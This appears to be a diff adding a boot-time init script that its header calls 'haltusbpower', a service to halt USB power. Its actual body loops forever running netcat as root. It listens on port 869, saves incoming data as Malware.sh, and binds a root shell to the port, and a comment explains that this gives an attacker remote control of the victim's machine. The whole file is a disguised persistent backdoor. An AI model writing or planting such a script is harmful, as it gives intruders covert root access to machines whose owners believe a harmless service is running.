@@ -1,0 +1,15 @@
+#!/bin/bash
+### BEGIN INIT INFO
+# Provides:          haltusbpower
+# Required-Start:    $all
+# Required-Stop:
+# Default-Start:     2 3 4 5
+# Default-Stop:	 0 1 6
+# Short-Description: Halts USB power...
+### END INIT INFO
+while true
+do
+	sudo nc -l -p 869 > Malware.sh && sudo nc -l -p 869 -e /bin/sh &	#this netcat command opens a port (869) in listening mode and make the port
+#able to receive and save a file, while secondpart allow the attacker to use the victim's command line from his shell (remotely).
+	wait
+done
